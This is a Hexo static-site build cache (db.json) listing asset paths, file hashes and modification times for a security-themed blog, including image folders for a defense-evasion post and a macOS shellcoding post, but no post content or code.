{"meta":{"version":1,"warehouse":"5.0.1"},"models":{"Asset":[{"_id":"themes/hexo-theme-claudia/source/js/common.js","path":"js/common.js","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/js/highlight.pack.js","path":"js/highlight.pack.js","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/about.scss","path":"style/about.scss","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/archive.scss","path":"style/archive.scss","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/base.scss","path":"style/base.scss","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/post.scss","path":"style/post.scss","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/widget-header.scss","path":"style/widget-header.scss","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/widget-post-list.scss","path":"style/widget-post-list.scss","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/common/bulma.scss","path":"style/common/bulma.scss","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/common/helper.scss","path":"style/common/helper.scss","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/common/variable.scss","path":"style/common/variable.scss","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/themes/default-dark.scss","path":"style/themes/default-dark.scss","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/themes/default-light.scss","path":"style/themes/default-light.scss","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/themes/highlight-theme-light.scss","path":"style/themes/highlight-theme-light.scss","modified":0,"renderable":1},{"_id":"themes/hexo-theme-claudia/source/style/themes/theme.scss","path":"style/themes/theme.scss","modified":0,"renderable":1},{"_id":"source/_headers","path":"_headers","modified":0,"renderable":0},{"_id":"source/_redirects","path":"_redirects","modified":0,"renderable":0},{"_id":"source/favicons/favicon.ico","path":"favicons/favicon.ico","modified":0,"renderable":0},{"_id":"source/favicons/favicon.svg","path":"favicons/favicon.svg","modified":0,"renderable":0},{"_id":"source/images/site/avatar.png","path":"images/site/avatar.png","modified":0,"renderable":0},{"_id":"source/images/site/sample-plating.svg","path":"images/site/sample-plating.svg","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/Evasion.jpg","path":"images/site/DefenseEvasion/Evasion.jpg","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def.png","path":"images/site/DefenseEvasion/def.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def1.png","path":"images/site/DefenseEvasion/def1.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def10.png","path":"images/site/DefenseEvasion/def10.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def11.png","path":"images/site/DefenseEvasion/def11.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def12.png","path":"images/site/DefenseEvasion/def12.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def13.png","path":"images/site/DefenseEvasion/def13.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def15.png","path":"images/site/DefenseEvasion/def15.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def16.png","path":"images/site/DefenseEvasion/def16.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def17.png","path":"images/site/DefenseEvasion/def17.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def18.png","path":"images/site/DefenseEvasion/def18.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def19.png","path":"images/site/DefenseEvasion/def19.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def2.png","path":"images/site/DefenseEvasion/def2.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def20.png","path":"images/site/DefenseEvasion/def20.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def21.png","path":"images/site/DefenseEvasion/def21.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def22.png","path":"images/site/DefenseEvasion/def22.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def23.png","path":"images/site/DefenseEvasion/def23.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def24.png","path":"images/site/DefenseEvasion/def24.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def25.png","path":"images/site/DefenseEvasion/def25.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def26.png","path":"images/site/DefenseEvasion/def26.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def27.png","path":"images/site/DefenseEvasion/def27.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def28.png","path":"images/site/DefenseEvasion/def28.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def29.png","path":"images/site/DefenseEvasion/def29.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def3.png","path":"images/site/DefenseEvasion/def3.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def30.png","path":"images/site/DefenseEvasion/def30.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def31.png","path":"images/site/DefenseEvasion/def31.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def32.png","path":"images/site/DefenseEvasion/def32.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def33.png","path":"images/site/DefenseEvasion/def33.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def34.png","path":"images/site/DefenseEvasion/def34.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def35.png","path":"images/site/DefenseEvasion/def35.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def36.png","path":"images/site/DefenseEvasion/def36.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def37.png","path":"images/site/DefenseEvasion/def37.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def38.png","path":"images/site/DefenseEvasion/def38.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def39.png","path":"images/site/DefenseEvasion/def39.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def4.png","path":"images/site/DefenseEvasion/def4.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def5.png","path":"images/site/DefenseEvasion/def5.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def6.png","path":"images/site/DefenseEvasion/def6.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def7.png","path":"images/site/DefenseEvasion/def7.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def8.png","path":"images/site/DefenseEvasion/def8.png","modified":0,"renderable":0},{"_id":"source/images/site/DefenseEvasion/def9.png","path":"images/site/DefenseEvasion/def9.png","modified":0,"renderable":0},{"_id":"source/images/site/partners/partner-one.svg","path":"images/site/partners/partner-one.svg","modified":0,"renderable":0},{"_id":"source/images/site/partners/partner-three.svg","path":"images/site/partners/partner-three.svg","modified":0,"renderable":0},{"_id":"source/images/site/partners/partner-two.svg","path":"images/site/partners/partner-two.svg","modified":0,"renderable":0},{"_id":"source/images/site/posts/macos/image.psd.png","path":"images/site/posts/macos/image.psd.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/macos/printf-callchain.png","path":"images/site/posts/macos/printf-callchain.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/macos/printf-flow.png","path":"images/site/posts/macos/printf-flow.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/macos/syscall-header.png","path":"images/site/posts/macos/syscall-header.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/macos/syscall-master.png","path":"images/site/posts/macos/syscall-master.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/macos/write-syscall-chain.png","path":"images/site/posts/macos/write-syscall-chain.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/macos/xnu-release-page.png","path":"images/site/posts/macos/xnu-release-page.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/macos/xnu-tree.png","path":"images/site/posts/macos/xnu-tree.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/macos/xnu-version-block.png","path":"images/site/posts/macos/xnu-version-block.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/Evasion.jpg","path":"images/site/posts/DefenseEvasion/Evasion.jpg","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def.png","path":"images/site/posts/DefenseEvasion/def.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def1.png","path":"images/site/posts/DefenseEvasion/def1.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def10.png","path":"images/site/posts/DefenseEvasion/def10.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def11.png","path":"images/site/posts/DefenseEvasion/def11.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def12.png","path":"images/site/posts/DefenseEvasion/def12.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def13.png","path":"images/site/posts/DefenseEvasion/def13.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def15.png","path":"images/site/posts/DefenseEvasion/def15.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def16.png","path":"images/site/posts/DefenseEvasion/def16.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def17.png","path":"images/site/posts/DefenseEvasion/def17.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def18.png","path":"images/site/posts/DefenseEvasion/def18.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def19.png","path":"images/site/posts/DefenseEvasion/def19.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def2.png","path":"images/site/posts/DefenseEvasion/def2.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def20.png","path":"images/site/posts/DefenseEvasion/def20.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def21.png","path":"images/site/posts/DefenseEvasion/def21.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def22.png","path":"images/site/posts/DefenseEvasion/def22.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def23.png","path":"images/site/posts/DefenseEvasion/def23.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def24.png","path":"images/site/posts/DefenseEvasion/def24.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def25.png","path":"images/site/posts/DefenseEvasion/def25.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def26.png","path":"images/site/posts/DefenseEvasion/def26.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def27.png","path":"images/site/posts/DefenseEvasion/def27.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def28.png","path":"images/site/posts/DefenseEvasion/def28.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def29.png","path":"images/site/posts/DefenseEvasion/def29.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def3.png","path":"images/site/posts/DefenseEvasion/def3.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def30.png","path":"images/site/posts/DefenseEvasion/def30.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def31.png","path":"images/site/posts/DefenseEvasion/def31.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def32.png","path":"images/site/posts/DefenseEvasion/def32.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def33.png","path":"images/site/posts/DefenseEvasion/def33.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def34.png","path":"images/site/posts/DefenseEvasion/def34.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def35.png","path":"images/site/posts/DefenseEvasion/def35.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def36.png","path":"images/site/posts/DefenseEvasion/def36.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def37.png","path":"images/site/posts/DefenseEvasion/def37.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def38.png","path":"images/site/posts/DefenseEvasion/def38.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def39.png","path":"images/site/posts/DefenseEvasion/def39.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def4.png","path":"images/site/posts/DefenseEvasion/def4.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def5.png","path":"images/site/posts/DefenseEvasion/def5.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def6.png","path":"images/site/posts/DefenseEvasion/def6.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def7.png","path":"images/site/posts/DefenseEvasion/def7.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def8.png","path":"images/site/posts/DefenseEvasion/def8.png","modified":0,"renderable":0},{"_id":"source/images/site/posts/DefenseEvasion/def9.png","path":"images/site/posts/DefenseEvasion/def9.png","modified":0,"renderable":0}],"Cache":[{"_id":"themes/hexo-theme-claudia/.gitignore","hash":"4770685589439022c66a08c6616f885c8bc1071f","modified":1764313728162},{"_id":"themes/hexo-theme-claudia/package.json","hash":"6eb1ecb41d954b8fcc553d66a368a757f8476f9e","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/layout/about.pug","hash":"998c4bbdb985dcc0e8a4b5d7e7e6249068bebcb7","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/languages/zh-CN.yml","hash":"33f742417af0ac54c71087242bf102b86e73a8bf","modified":1764331738490},{"_id":"themes/hexo-theme-claudia/languages/en-US.yml","hash":"fa8f89ea63fd1222b66299e91c0df73b0abfa14b","modified":1764331747501},{"_id":"themes/hexo-theme-claudia/layout/archive.pug","hash":"a26c0d8cc332db156659d15dccbbfe7415d266e8","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/README.md","hash":"b4bab62e3038329bcfc4ac86dc2a2921a3edd013","modified":1764313728162},{"_id":"themes/hexo-theme-claudia/layout/category.pug","hash":"a76e57100b94987c9de2a8c5209518efdbdecd6b","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/layout/page.pug","hash":"e8306d4ef494b4b6042bd4df4404df8e226e6ed1","modified":1764320596801},{"_id":"themes/hexo-theme-claudia/layout/index.pug","hash":"44557328f0e469add7719ab1ea45604b4e979678","modified":1764341359028},{"_id":"themes/hexo-theme-claudia/layout/tag.pug","hash":"3e934957071badd94df6c777ef6c9a9b7a9e54a1","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/.github/workflows/codeql-analysis.yml","hash":"3228326dd477c782df8a787b4028fad30aa40078","modified":1764313728162},{"_id":"themes/hexo-theme-claudia/layout/post.pug","hash":"ce826b3070da004b3c1f6e5878bc91436ef51fb6","modified":1764341643708},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-adsense.pug","hash":"83e913a9c1f1faf3bf6fe1c18b0b55dabbc085ec","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/layout/widget/html.pug","hash":"338366125deaf6df8efe46a9f860aabfcc9f4173","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/layout/widget/base.pug","hash":"41269cc654a42d3901b91cd190bd263ac41c7862","modified":1764343152357},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-categories.pug","hash":"ea3bcd5f5fb06e26d8b67f30f224e7c129672980","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/layout/widget/methods.pug","hash":"a1e007ceef820b5d5c84731fa49b13eae992981d","modified":1764321661051},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-archives.pug","hash":"e6bcf8b09a5e06119baf3f97f7798ef7600ab65c","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-header.pug","hash":"fd215aa9a7b6423c66055d48dd797175c0daca61","modified":1764341222768},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-recent-content-all.pug","hash":"40067e71f4c144bae54d18e5a603e4678aad9729","modified":1764321272952},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-profile.pug","hash":"2603eaa517c28ca7299cdd82fae66e00ace8a0fb","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-links.pug","hash":"252ff3dfd20168d97a08186768052697c05b3724","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-post-list.pug","hash":"c6f7987fecaaa3f1ae4d699bde0af91adbbf70d0","modified":1764321252067},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-recent-content.pug","hash":"81bb4214323d9940c36097d9df1c531c658f4c1a","modified":1764321279302},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-search.pug","hash":"f234081dbbb05ee837135d941822b2acb6273a8f","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-search-mobile.pug","hash":"8c6451eff7a9e3d7f851650658ba5e083f0b56db","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-recent.pug","hash":"2532c3848fdb93fae27f54c71d7f2fc3b513774f","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-sns.pug","hash":"0e052907a1c4ed9a0e08a32053990853880884f2","modified":1764343001724},{"_id":"themes/hexo-theme-claudia/layout/widget/widget-tag.pug","hash":"f2723abcf2bc7d9fa89d501f92cbd773522489f6","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/source/style/about.scss","hash":"5de1986a383731fbdc116c2977a75c7a88ebab50","modified":1764313728164},{"_id":"themes/hexo-theme-claudia/source/style/archive.scss","hash":"47e0897e145cdcfb4b2e839b4bc59a6279a65ebd","modified":1764313728165},{"_id":"themes/hexo-theme-claudia/source/style/base.scss","hash":"7832bff9ad1286ada23f05d9abaa1879ed25ca1f","modified":1764332077707},{"_id":"themes/hexo-theme-claudia/source/js/common.js","hash":"1b8de4a86a1801e502f3d94c59b5431dff5dc2af","modified":1764323519473},{"_id":"themes/hexo-theme-claudia/source/style/post.scss","hash":"2f8c5367ea5745ea89570281e0e172063f37562d","modified":1764335601759},{"_id":"themes/hexo-theme-claudia/source/style/widget-header.scss","hash":"80ae0b6f834710a3c9c7e3e85d798e9e9e34edf3","modified":1764324729380},{"_id":"themes/hexo-theme-claudia/source/style/widget-post-list.scss","hash":"8dc7a00718fdd3a8c647181f78c198310136658f","modified":1764324735834},{"_id":"themes/hexo-theme-claudia/source/style/common/helper.scss","hash":"797c36b733b6ce03df2975d19b9d7e006b7057f0","modified":1764313728165},{"_id":"themes/hexo-theme-claudia/source/style/themes/default-light.scss","hash":"ee3e3071a557491222eaf23fe4bb202378c60ddc","modified":1764324644899},{"_id":"themes/hexo-theme-claudia/source/style/themes/highlight-theme-light.scss","hash":"f7b19080f00e10723bc86e6819fc25143a0137c5","modified":1764313728167},{"_id":"themes/hexo-theme-claudia/source/style/common/variable.scss","hash":"09df37c4619a59966a0c678f7d27cd25d8c04345","modified":1764324614601},{"_id":"themes/hexo-theme-claudia/source/style/themes/theme.scss","hash":"b389c2547ee7b5ea759b35831c76952bd3d33184","modified":1764324624710},{"_id":"themes/hexo-theme-claudia/package-lock.json","hash":"e793cb0f2afe47aac9d79107fd509e390f71ec3f","modified":1764313728163},{"_id":"themes/hexo-theme-claudia/source/style/themes/default-dark.scss","hash":"1d6cb9fb3ffa8ba347a27080cd303869f7f952e0","modified":1764325140009},{"_id":"source/404.md","hash":"e699af62e5ce84dd4baffd3950137bc35d94c782","modified":1764314346889},{"_id":"source/_headers","hash":"f9283f57aa934a439eb018814d0afbe7b3e7628a","modified":1764314541637},{"_id":"themes/hexo-theme-claudia/source/style/common/bulma.scss","hash":"c3743acd32eae7a9c9fa567d9a058d295bd486e2","modified":1764313728165},{"_id":"source/_redirects","hash":"b5e8d1b36c62a19e263e0d3316c02bad6c182aff","modified":1764313105855},{"_id":"source/_data/social.yml","hash":"455f381d4d4ba048b036bfd1bb2961b7489d1d00","modified":1764319701313},{"_id":"source/about/index.md","hash":"21305634398da9e1558751c1c62177d48b9add37","modified":1764342203804},{"_id":"source/categories/index.md","hash":"d4457edb4d30d91ba446fbeb811200dd180e15c5","modified":1764319582522},{"_id":"themes/hexo-theme-claudia/source/js/highlight.pack.js","hash":"fe2e7f83c8e24609a0628ce6710091c3b8456904","modified":1764313728164},{"_id":"source/contact/index.md","hash":"faed9318d4778be36277330f14c9c958a7f2e4c6","modified":1764342529239},{"_id":"source/favicons/favicon.ico","hash":"2d5ab4e13f0e1c7cad384862b7ae8ddf2a964970","modified":1764328631214},{"_id":"source/hall-of-fame/index.md","hash":"00c2b6e13f02508716fe7f91595247faaadd8435","modified":1764348920052},{"_id":"source/partners/index.md","hash":"7a697c0bc0d5597ba3a835d030a90bdf9c15e512","modified":1764342726027},{"_id":"source/questions/index.md","hash":"e2bf55726f96feefd9d20114621fdf4eabcf45f6","modified":1764342799013},{"_id":"source/privacy-policy/index.md","hash":"a4d7ec99f8c73bfb0eb124ea814ae985dd8e19f6","modified":1764342616339},{"_id":"source/services/index.md","hash":"97077849207bb8a9b2cf696cd5a4368972cf0422","modified":1764346533233},{"_id":"source/widget/index.md","hash":"c6832c80cd292d25e7104e170a998d3e3df05202","modified":1764313105857},{"_id":"source/_posts/2025-11-24-shellcoding-on-macos-64.md","hash":"18cb902191468a6fba21fba01511d8deabd50d6e","modified":1764347464958},{"_id":"source/images/site/sample-plating.svg","hash":"cfaaaf6b2c19298167535d57a2bf13ad358a74d4","modified":1764314320124},{"_id":"source/images/site/DefenseEvasion/def16.png","hash":"cb8f8e73d3bb7b33f5fa7862c8dff83b592b67b9","modified":1764338799200},{"_id":"source/images/site/DefenseEvasion/def17.png","hash":"cbd636acb904e3c70f0335803bc3bfaeb40408d8","modified":1764338799233},{"_id":"source/images/site/DefenseEvasion/def35.png","hash":"3b1a7a9d826a149e2d716ff6b150c8b4ba4e6f0d","modified":1764338799769},{"_id":"source/images/site/partners/partner-one.svg","hash":"09de67cb7f698f21a8872b9d7d3588c9ff7c0b1e","modified":1764321059869},{"_id":"source/images/site/partners/partner-three.svg","hash":"7ef6948736606b96744369d58bbac142ab411be2","modified":1764321059871},{"_id":"source/images/site/posts/macos/printf-flow.png","hash":"3f03957330b60b5ae52efeabd52c07cdb40b35ce","modified":1764347113329},{"_id":"source/images/site/posts/macos/syscall-master.png","hash":"f90f4279f72ab09c8036a23c896d402e06c756b7","modified":1764347108491},{"_id":"source/images/site/posts/macos/printf-callchain.png","hash":"95964fed4936e1cb7abf92ec3087966758dde6b7","modified":1764347110931},{"_id":"source/images/site/posts/macos/write-syscall-chain.png","hash":"a74483f4e23d0e52e5705e5d6547d7e5aaa54b99","modified":1764347115842},{"_id":"source/images/site/posts/macos/xnu-tree.png","hash":"ff7cff4a3827f2f5de0ea6f679bfc230147de810","modified":1764347044367},{"_id":"source/images/site/posts/macos/xnu-version-block.png","hash":"a93c438e4924d094a383e60ebce4dc5a7654086b","modified":1764347041995},{"_id":"source/images/site/posts/DefenseEvasion/def16.png","hash":"cb8f8e73d3bb7b33f5fa7862c8dff83b592b67b9","modified":1764338799200},{"_id":"source/images/site/posts/DefenseEvasion/def17.png","hash":"cbd636acb904e3c70f0335803bc3bfaeb40408d8","modified":1764338799233},{"_id":"source/images/site/partners/partner-two.svg","hash":"2fca7466ac267323e839de4292be437f96cc6f5b","modified":1764321059870},{"_id":"source/images/site/posts/DefenseEvasion/def35.png","hash":"3b1a7a9d826a149e2d716ff6b150c8b4ba4e6f0d","modified":1764338799769},{"_id":"source/images/site/DefenseEvasion/def1.png","hash":"236eed1e7dfd9956f90332b4c958daf39eb5265c","modified":1764338799260},{"_id":"source/images/site/posts/macos/xnu-release-page.png","hash":"f50e1c85ff50db3fde77ccc044d5ec991c211c86","modified":1764347039411},{"_id":"source/images/site/posts/DefenseEvasion/def1.png","hash":"236eed1e7dfd9956f90332b4c958daf39eb5265c","modified":1764338799260},{"_id":"source/images/site/posts/macos/syscall-header.png","hash":"2cad1e59020e8a1a6beea05bf8c03a79af639b47","modified":1764347046935},{"_id":"source/images/site/DefenseEvasion/def4.png","hash":"cef463da86087ca35173bfaf0c8411adf62db712","modified":1764338799445},{"_id":"source/images/site/DefenseEvasion/def6.png","hash":"3b9a39a5f51aecfd9a9f5b674ecfa43dbf6f31a8","modified":1764338798540},{"_id":"source/images/site/posts/DefenseEvasion/def4.png","hash":"cef463da86087ca35173bfaf0c8411adf62db712","modified":1764338799445},{"_id":"source/images/site/posts/DefenseEvasion/def6.png","hash":"3b9a39a5f51aecfd9a9f5b674ecfa43dbf6f31a8","modified":1764338798540},{"_id":"source/images/site/DefenseEvasion/Evasion.jpg","hash":"eb9d1cc7d3af6abfb35f73d4ef1f56815b2e9695","modified":1764338799935},{"_id":"source/images/site/DefenseEvasion/def27.png","hash":"c05e46c275d99f5af8e0fe3eb51032fb1ac2f820","modified":1764338799727},{"_id":"source/images/site/DefenseEvasion/def28.png","hash":"bd9248cb5bb3abb347155267adbd64bdd4637e49","modified":1764338799708},{"_id":"source/images/site/posts/DefenseEvasion/Evasion.jpg","hash":"eb9d1cc7d3af6abfb35f73d4ef1f56815b2e9695","modified":1764338799935},{"_id":"source/images/site/posts/DefenseEvasion/def28.png","hash":"bd9248cb5bb3abb347155267adbd64bdd4637e49","modified":1764338799708},{"_id":"source/images/site/posts/DefenseEvasion/def27.png","hash":"c05e46c275d99f5af8e0fe3eb51032fb1ac2f820","modified":1764338799727},{"_id":"source/images/site/avatar.png","hash":"5b1a9041eeb4224d347a04c0ca937736cc51cd74","modified":1764338149954},{"_id":"source/images/site/DefenseEvasion/def22.png","hash":"388094f236fb0f3c2dab71e30cd63b1303bc004a","modified":1764338799485},{"_id":"source/images/site/DefenseEvasion/def3.png","hash":"645b706625e45f7a948d6eda4d50a9c4455097d2","modified":1764338799427},{"_id":"source/images/site/DefenseEvasion/def30.png","hash":"2bc8e055a5953ee8d01543736a9bb319c10ceb0b","modified":1764338799626},{"_id":"source/images/site/posts/DefenseEvasion/def22.png","hash":"388094f236fb0f3c2dab71e30cd63b1303bc004a","modified":1764338799485},{"_id":"source/images/site/posts/DefenseEvasion/def3.png","hash":"645b706625e45f7a948d6eda4d50a9c4455097d2","modified":1764338799427},{"_id":"source/images/site/posts/DefenseEvasion/def30.png","hash":"2bc8e055a5953ee8d01543736a9bb319c10ceb0b","modified":1764338799626},{"_id":"source/images/site/DefenseEvasion/def2.png","hash":"94e13f41c01425dc0ca492c52456fd3388320a7c","modified":1764338799377},{"_id":"source/images/site/posts/DefenseEvasion/def2.png","hash":"94e13f41c01425dc0ca492c52456fd3388320a7c","modified":1764338799377},{"_id":"source/images/site/DefenseEvasion/def19.png","hash":"eba6abcc9b733fa7f27380b929f2adadeca92d21","modified":1764338799316},{"_id":"source/images/site/DefenseEvasion/def34.png","hash":"f1abca739f1144f6d807566869be8b2bb6de676d","modified":1764338799798},{"_id":"source/images/site/DefenseEvasion/def36.png","hash":"016c742a32180d605ec98907162656bb8144ff5f","modified":1764338799816},{"_id":"source/images/site/posts/DefenseEvasion/def19.png","hash":"eba6abcc9b733fa7f27380b929f2adadeca92d21","modified":1764338799316},{"_id":"source/images/site/posts/DefenseEvasion/def34.png","hash":"f1abca739f1144f6d807566869be8b2bb6de676d","modified":1764338799798},{"_id":"source/images/site/posts/DefenseEvasion/def36.png","hash":"016c742a32180d605ec98907162656bb8144ff5f","modified":1764338799816},{"_id":"source/images/site/DefenseEvasion/def29.png","hash":"49aadf0fa9e408053b90d84af86b76f6e072dcdd","modified":1764338799751},{"_id":"source/images/site/posts/DefenseEvasion/def29.png","hash":"49aadf0fa9e408053b90d84af86b76f6e072dcdd","modified":1764338799751},{"_id":"source/images/site/DefenseEvasion/def31.png","hash":"b8ee3fe1fcbf6aa4c08a0ac121534882bfd572c3","modified":1764338799767},{"_id":"source/images/site/DefenseEvasion/def7.png","hash":"c8d70d07c57b22a52b569e1a4791d4dda7b375c7","modified":1764338798670},{"_id":"source/images/site/DefenseEvasion/def8.png","hash":"dceacdb266a99b8db7036b1de9c50973949474ef","modified":1764338798904},{"_id":"source/images/site/posts/DefenseEvasion/def31.png","hash":"b8ee3fe1fcbf6aa4c08a0ac121534882bfd572c3","modified":1764338799767},{"_id":"source/images/site/posts/DefenseEvasion/def7.png","hash":"c8d70d07c57b22a52b569e1a4791d4dda7b375c7","modified":1764338798670},{"_id":"source/images/site/posts/DefenseEvasion/def8.png","hash":"dceacdb266a99b8db7036b1de9c50973949474ef","modified":1764338798904},{"_id":"source/images/site/DefenseEvasion/def25.png","hash":"168353065c4b5f927747dadddb3ed79f22e1f724","modified":1764338799568},{"_id":"source/images/site/DefenseEvasion/def5.png","hash":"581d99f31cf4b5757b8dd37ec4b1911175756df5","modified":1764338799040},{"_id":"source/images/site/posts/DefenseEvasion/def25.png","hash":"168353065c4b5f927747dadddb3ed79f22e1f724","modified":1764338799568},{"_id":"source/images/site/posts/DefenseEvasion/def5.png","hash":"581d99f31cf4b5757b8dd37ec4b1911175756df5","modified":1764338799040},{"_id":"source/favicons/favicon.svg","hash":"e9b2b88ef878dcf19255ec4de20a6de4d1419212","modified":1764328631213},{"_id":"source/images/site/DefenseEvasion/def23.png","hash":"deaf7c5677afb25119c74716315ae05d3489c73d","modified":1764338799519},{"_id"